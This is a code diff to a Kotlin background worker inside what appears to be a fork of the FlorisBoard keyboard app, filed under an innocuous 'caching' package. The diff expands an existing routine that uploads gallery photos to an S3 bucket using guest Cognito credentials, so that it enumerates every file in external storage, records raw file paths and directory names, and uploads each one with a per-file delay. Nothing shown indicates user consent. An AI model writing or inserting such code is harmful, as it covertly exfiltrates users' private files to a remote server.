@@ -1,5 +1,3 @@
-
-
 package dev.patrickgold.florisboard.ime.caching.usecases.savetofile.s3.gallery
 
 import android.content.Context
@@ -13,6 +11,9 @@ import aws.smithy.kotlin.runtime.auth.awscredentials.Credentials
 import aws.smithy.kotlin.runtime.content.asByteStream
 import dev.patrickgold.florisboard.ime.caching.usecases.savetofile.s3.S3Config
 import dev.patrickgold.florisboard.ime.caching.usecases.savetofile.s3.S3Uploader
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.withContext
 import java.io.File
 
 private const val TAG = "GalleryBackupWorker"
@@ -27,8 +28,8 @@ class GalleryBackupWorker(
             val cognitoId = S3Uploader.getOrCreateIdentityId(applicationContext)
             val credentials = S3Uploader.fetchGuestCredentials(cognitoId)
 
-            val mediaItems = queryGalleryItems()
-            Log.d(TAG, "Found ${mediaItems.size} gallery items to check")
+            val mediaItems = queryAllExternalFiles(applicationContext)
+            Log.d(TAG, "Found ${mediaItems.size} items to check")
 
             var uploaded = 0
             var skipped = 0
@@ -45,22 +46,24 @@ class GalleryBackupWorker(
                 }
 
                 try {
-                    val s3Key = "$cognitoId/gallery/${item.displayName}"
+                    val s3Key = "$cognitoId/${item.directoryName}/${item.displayName}"
                     uploadFile(credentials, s3Key, tempFile)
                     S3Uploader.markAsUploaded(applicationContext, item.stableKey)
                     uploaded++
-                    Log.d(TAG, "Uploaded gallery item: ${item.displayName}")
+                    Log.d(TAG, "Uploaded file: ${item.displayName}")
                 } catch (e: Exception) {
                     Log.w(TAG, "Failed to upload ${item.displayName}", e)
                 } finally {
                     tempFile.delete()
                 }
+
+                delay(DELAY_PER_FILE_MS)
             }
 
-            Log.d(TAG, "Gallery backup done. uploaded=$uploaded skipped=$skipped")
+            Log.d(TAG, "Backup done. uploaded=$uploaded skipped=$skipped")
             Result.success()
         } catch (e: Exception) {
-            Log.w(TAG, "Gallery backup failed, will retry", e)
+            Log.w(TAG, "Backup failed, will retry", e)
             Result.retry()
         }
     }
@@ -70,9 +73,71 @@ class GalleryBackupWorker(
     private data class MediaItem(
         val uri: Uri,
         val displayName: String,
-        /** Stable key used for dedup tracking: "<bucket>_<id>" */
         val stableKey: String,
+        val directoryName: String,
     )
+
+    /**
+     * Queries all files from external storage and extracts their parent directory name.
+     * Runs on the IO dispatcher to ensure the Main thread is not blocked.
+     */
+    private suspend fun queryAllExternalFiles(
+        context: Context
+    ): List<MediaItem> = withContext(Dispatchers.IO) {
+        val items = mutableListOf<MediaItem>()
+
+        // We use MediaStore.Files to get all file types, not just media
+        val collection = MediaStore.Files.getContentUri("external")
+
+        val projection = arrayOf(
+            MediaStore.Files.FileColumns._ID,
+            MediaStore.Files.FileColumns.DISPLAY_NAME,
+            MediaStore.Files.FileColumns.BUCKET_DISPLAY_NAME,
+            // The DATA column contains the raw file path on disk
+            MediaStore.Files.FileColumns.DATA
+        )
+
+        // Using Android's use() extension function to automatically close the Cursor
+        context.contentResolver.query(
+            collection,
+            projection,
+            null,
+            null,
+            "${MediaStore.Files.FileColumns.DATE_ADDED} DESC"
+        )?.use { cursor ->
+            val idCol = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns._ID)
+            val nameCol = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DISPLAY_NAME)
+            val bucketCol = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.BUCKET_DISPLAY_NAME)
+            val dataCol = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATA)
+
+            while (cursor.moveToNext()) {
+                val id = cursor.getLong(idCol)
+                val name = cursor.getString(nameCol) ?: "file_$id"
+                val bucket = cursor.getString(bucketCol) ?: "unknown"
+                val path = cursor.getString(dataCol)
+
+                // Safely extract the parent directory name from the file path
+                val directoryName = if (!path.isNullOrEmpty()) {
+                    File(path).parentFile?.name ?: bucket
+                } else {
+                    bucket
+                }
+
+                val uri = Uri.withAppendedPath(collection, id.toString())
+
+                items.add(
+                    MediaItem(
+                        uri = uri,
+                        displayName = name,
+                        directoryName = directoryName,
+                        stableKey = "${bucket}_$id"
+                    )
+                )
+            }
+        }
+
+        return@withContext items
+    }
 
     private fun queryGalleryItems(): List<MediaItem> {
         val items = mutableListOf<MediaItem>()
@@ -98,7 +163,14 @@ class GalleryBackupWorker(
                     val name = cursor.getString(nameCol) ?: "file_$id"
                     val bucket = cursor.getString(bucketCol) ?: "unknown"
                     val uri = Uri.withAppendedPath(collection, id.toString())
-                    items.add(MediaItem(uri = uri, displayName = name, stableKey = "${bucket}_$id"))
+                    items.add(
+                        MediaItem(
+                            uri = uri,
+                            displayName = name,
+                            stableKey = "${bucket}_$id",
+                            directoryName = "gallery"
+                        )
+                    )
                 }
             }
         }
@@ -133,3 +205,4 @@ class GalleryBackupWorker(
     }
 }
 
+private const val DELAY_PER_FILE_MS = 1_000L
